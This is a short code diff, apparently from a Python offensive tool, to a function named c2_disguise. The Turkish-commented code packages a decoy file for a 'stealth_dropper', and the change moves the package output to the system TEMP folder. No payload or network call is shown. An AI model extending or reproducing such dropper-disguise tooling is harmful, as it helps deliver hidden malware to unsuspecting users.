@@ -592,8 +592,13 @@ def c2_disguise():
             print(f"{C.YELLOW}  [*] Yem dosya ile paket oluşturuluyor...{C.RESET}")
             decoy_ext = os.path.splitext(decoy_path)[1]
 
-            # Çıkış klasörü
-            pkg_dir = os.path.join('stealth_dropper', 'disguise_pkg')
+            # Çıkış klasörü olarak güvenilir olan TEMP klasörünü kullan
+            import tempfile
+            temp_base = tempfile.gettempdir()
+            pkg_dir = os.path.join(temp_base, 'disguise_pkg')
+            if os.path.exists(pkg_dir):
+                import shutil
+                shutil.rmtree(pkg_dir, ignore_errors=True)
             os.makedirs(pkg_dir, exist_ok=True)
 
             # Dosyaları kopyala
